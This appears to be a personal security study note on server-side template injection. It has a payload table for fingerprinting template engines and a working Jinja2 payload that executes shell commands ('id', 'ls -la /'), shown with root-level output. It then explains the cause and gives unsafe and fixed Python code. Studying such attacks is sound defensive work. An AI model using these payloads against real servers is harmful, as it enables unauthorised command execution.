
If you find a field which is vulnerable to SSTI, use the following to test which kind of server it is and the responses:

| Payload      | Engine                         | Result                                               |
| ------------ | ------------------------------ | ---------------------------------------------------- |
| `{{7*7}}`    | Jinja2, Twig                   | `49`                                                 |
| `${7*7}`     | FreeMarker, Velocity (sort of) | `49`                                                 |
| `#{7*7}`     | some older engines             | `49`                                                 |
| `<%= 7*7 %>` | ERB (Ruby)                     | `49`                                                 |
| `{{7*'7'}}`  | Jinja2                         | `7777777` (Python string repeat) vs Twig would error |

Whichever one reflects `49` is where you wanna go

For Jina2 try this now:
``` 
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
If it works the output should look like this:
``` *output*
# uid=0(root) gid=0(root) groups=0(root)
```
You can edit the payload like this to look around:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}
```

## Why it happens
A template combines fixed source with separate data. The engine evaluates template syntax (`{{ name }}`) on the server, before the browser ever sees the result — SSTI happens when user input becomes part of the *template source* instead of staying a *data value* passed into it.
```python
# unsafe — input becomes template source
template = env.from_string("Hello " + input_name)
output = template.render()

# corrected — input remains a data value
template = env.from_string("Hello {{ name }}")
output = template.render(name=input_name)
```
| Input | Unsafe output | Corrected output |
| --- | --- | --- |
| `Alice` | `Hello Alice` | `Hello Alice` |
| `{{7*7}}` | `Hello 49` | `Hello {{7*7}}` (literal text) |
| the RCE payload above | executes | literal text, inert |

Input must fill a value slot, never become the template source itself — same underlying principle as [[SQL Injection]]'s prepared statements and [[Cross-Site Scripting]]'s safe output context.